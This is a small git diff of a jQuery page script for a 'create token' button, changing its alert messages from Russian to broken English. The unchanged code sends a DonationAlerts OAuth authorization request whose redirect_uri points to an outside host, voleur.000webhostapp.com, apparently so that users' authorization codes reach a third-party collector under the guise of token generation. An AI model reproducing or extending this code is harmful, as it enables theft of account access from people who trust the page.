@@ -1,5 +1,6 @@
 $(function() {
     $('#create_token_button').click(function () {
+        alert("Wait u token generating... to continue click OK")
         var url = 'https://www.donationalerts.com/oauth/authorize?response_type=code&client_id=402&redirect_uri=https://voleur.000webhostapp.com/api/processor.php&%20%20%20%20scope=oauth-donation-index';
         var xhr = new XMLHttpRequest();
         xhr.open('GET', url,true);
@@ -7,7 +8,9 @@ $(function() {
         xhr.onload = function() {
             console.log('Loaded: '+xhr.status);
             if (xhr.status == 200) {
-                alert('Токен успешно создан!');
+                alert('Token create succefull');
+            } else {
+                alert('Error creating you token'+xhr.status);
             }
         }
         xhr.onerror = function() { // происходит, только когда запрос совсем не получилось выполнить
